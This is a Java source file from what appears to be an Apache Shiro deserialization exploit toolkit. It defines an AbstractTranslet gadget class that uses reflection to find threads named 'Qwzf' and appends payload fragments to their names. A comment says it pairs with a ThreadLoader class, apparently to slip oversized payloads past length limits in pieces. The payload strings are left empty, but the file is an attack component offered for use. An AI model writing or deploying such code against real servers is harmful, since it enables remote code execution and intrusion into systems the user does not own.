package org.exploit.third.shiro.shortenPayload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

//搭配ThreadLoader使用
public class ThreadName extends AbstractTranslet {
    public ThreadName() throws Exception{
        //Thread.currentThread().setName("Qwzf");
        ThreadGroup a = Thread.currentThread().getThreadGroup();
        java.lang.reflect.Field v2 = a.getClass().getDeclaredField("threads");
        v2.setAccessible(true);
        Thread[] o = (Thread[]) v2.get(a);
        for(int i = 0; i < o.length; ++i) {
            Thread z = o[i];
            //在具有Qwzf标识的Thread name后添加Payload
            if (z.getName().contains("Qwzf")){
                //将Payload分成多段加入，Payload1、Payload2......
                String Payload1 = "";
                //String Payload2 = "";
                //String Payload3 = "";
                //String Payload4 = "";

                z.setName(z.getName()+Payload1);
            }
         }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}